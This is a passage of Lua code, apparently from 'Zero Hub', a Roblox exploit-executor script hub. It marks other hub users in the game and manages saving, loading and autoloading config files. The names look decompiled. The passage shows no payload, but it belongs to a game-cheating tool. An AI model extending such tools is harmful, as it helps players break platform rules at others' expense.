				billboardGui.Size = UDim2.new(5, 0, 5, 0)
				billboardGui.StudsOffset = Vector3.new(0, 1, 0)
				billboardGui.AlwaysOnTop = true
				billboardGui.Parent = head
				local imageLabel2 = Instance.new("ImageLabel")
				imageLabel2.Image = png
				imageLabel2.Size = UDim2.fromScale(1, 1)
				imageLabel2.BackgroundTransparency = 1
				imageLabel2.ScaleType = Enum.ScaleType.Fit
				imageLabel2.Parent = billboardGui
				tbl20[arg3] = billboardGui
			end

			fn48(localPlayer2.Character)

			localPlayer2.CharacterAdded:Connect(function(character)
				task.wait(1)
				fn48(character)
			end)

			local n3 = 0

			game:GetService("RunService").Heartbeat:Connect(function()
				if not flag8 or tick() - n3 < 3 then
					return
				end
				n3 = tick()
				fn48(localPlayer2.Character)
				local v22 = ipairs
				local Players2 = game:GetService("Players")

				for _, player in v22(Players2:GetPlayers()) do
					local character = player.Character

					if character and character:FindFirstChild("_ZH_V") then
						fn49(character)
					end
				end
			end)
		end)
	end

	local function fn48()
		flag8 = false

		for _, v22 in pairs(tbl20) do
			pcall(function()
				v22:Destroy()
			end)
		end

		tbl20 = {}
	end

	Interface:AddGroupbox("Script Users"):AddToggle("_ZeroScriptUsers", {
		Text = "Show Script Users",
		Description = "Shows an icon above Zero Hub users.",
		Default = true,
		Callback = function(arg3)
			if arg3 then
				fn47()
			else
				fn48()
			end
		end,
	})

	fn47()
	local Configs = Configuration:AddGroupbox("Configs")
	local zeroConfigName = Configs:AddInput("_ZeroConfigName", { Text = "Config Name", Placeholder = "MyConfig" })
	local zeroConfigList = Configs:AddDropdown("_ZeroConfigList", { Text = "Saved Configs", Values = fn36() })

	Configs:AddButton({
		Text = "Create / Save",
		Func = function()
			if fn41(zeroConfigName.Value) then
				zeroConfigList:SetValues(fn36())
			end
		end,
	})

	Configs:AddButton({
		Text = "Overwrite Selected",
		Func = function()
			if zeroConfigList.Value and zeroConfigList.Value ~= "" then
				fn41(zeroConfigList.Value)
			else
				tbl:Notify({ Title = "Config", Description = "Select a config to overwrite.", Type = "Warning" })
			end
		end,
	})

	Configs:AddButton({
		Text = "Load",
		Func = function()
			fn42(zeroConfigList.Value)
		end,
	})

	Configs:AddButton({
		Text = "Delete",
		Color = Color3.fromRGB(170, 55, 60),
		Func = function()
			if zeroConfigList.Value and zeroConfigList.Value ~= "" then
				pcall(function()
					delfile(str4 .. "/" .. zeroConfigList.Value .. ".json")
				end)

				zeroConfigList:SetValues(fn36())
				tbl:Notify({ Title = "Config", Description = "Deleted.", Type = "Success" })
			end
		end,
	})

	Configs:AddButton({
		Text = "Refresh List",
		Color = Color3.fromRGB(70, 70, 86),
		Func = function()
			zeroConfigList:SetValues(fn36())
		end,
	})

	Configs:AddDivider()

	Configs:AddButton({
		Text = "Set Autoload",
		Func = function()
			if zeroConfigList.Value and zeroConfigList.Value ~= "" then
				pcall(function()
					writefile("ZeroHub/Zero_Autoload.txt", zeroConfigList.Value)
				end)

				tbl:Notify({
					Title = "Autoload",
					Description = "Autoload set to '" .. zeroConfigList.Value .. "'.",
					Type = "Success",
				})
			end
		end,
	})

	Configs:AddButton({
		Text = "Clear Autoload",
		Color = Color3.fromRGB(70, 70, 86),
		Func = function()
			pcall(function()
				if isfile("ZeroHub/Zero_Autoload.txt") then
					delfile("ZeroHub/Zero_Autoload.txt")
				end
			end)

			tbl:Notify({ Title = "Autoload", Description = "Autoload cleared.", Type = "Info" })
		end,
	})

	task.spawn(function()
		task.wait(3)

		local ok3, result2 = pcall(function()
			if isfile("ZeroHub/Zero_Autoload.txt") then
				return readfile("ZeroHub/Zero_Autoload.txt")
			end
		end)

		if ok3 and result2 and result2 ~= "" and isfile(str4 .. "/" .. result2 .. ".json") then
			local ok4, result3 = pcall(function()
				return HttpService:JSONDecode(readfile(str4 .. "/" .. result2 .. ".json"))
			end)

			if ok4 and type(result3) == "table" then
				tbl.SkipAnimations = true
				fn40(result3)
				task.wait(0.1)
				tbl.SkipAnimations = false

				if tbl.Flags._ZeroAutoHide then
					task.wait(0.2)
					arg2.Main.Visible = false

					if settings.CursorEnabled then
						UserInputService.MouseIconEnabled = true
					end
				elseif settings.CursorEnabled then
					UserInputService.MouseIconEnabled = false
				end
			end
		end
	end)

	return Interface
end

return tbl
